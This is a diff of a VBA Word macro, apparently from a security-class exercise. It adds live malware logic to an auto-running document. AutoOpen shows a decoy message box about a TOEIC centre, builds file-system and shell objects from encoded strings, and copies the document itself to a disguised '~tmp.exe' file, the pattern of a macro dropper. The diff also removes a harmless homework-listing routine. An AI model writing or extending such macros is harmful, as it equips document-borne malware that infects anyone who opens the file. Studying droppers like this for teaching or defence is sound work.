@@ -1,4 +1,12 @@
 Sub AutoOpen()
+    Dim message As String
+    Dim title As String
+    
+    message = "Trung tam Toeic ABX" & vbCrLf
+    message = message & "Duong so 5, Phuong nt230, Quan UIT" & vbCrLf
+    title = "Thong tin"
+    MsgBox message,, title
+
     Dim fso As Object
     Dim sourcePath As String
     Dim targetPath As String
@@ -13,12 +21,12 @@ Sub AutoOpen()
     Set fso = CreateObject(fsoStr)
     Set shell = CreateObject(shellStr)
     sourcePath = ActiveDocument.Path & "\BT6.docm"
-    targetPath = ActiveDocument.Path & "\~temp.exe" 
+    targetPath = ActiveDocument.Path & "\~tmp.exe" 
         
     If fso.FileExists(targetPath) Then
         fso.DeleteFile targetPath
     End If
-    fso.MoveFile sourcePath, targetPath
+    fso.CopyFile sourcePath, targetPath
     
     Dim startTime As Double
     startTime = Timer
@@ -38,16 +46,3 @@ Function DecodeString(encoded As String) As String
     Next i
     DecodeString = result
 End Function
-
-Sub ShowInfo()
-    Dim message As String
-    Dim title As String
-    
-    message = "Bài tập số 1" & vbCrLf
-    message = message & "Bài tập số 2" & vbCrLf
-    message = message & "Bài tập số 3" & vbCrLf
-    message = message & "Bài tập số 4" & vbCrLf
-    title = "Bài tập về nhà"
-
-    MsgBox message, vbInformation, title
-End Sub
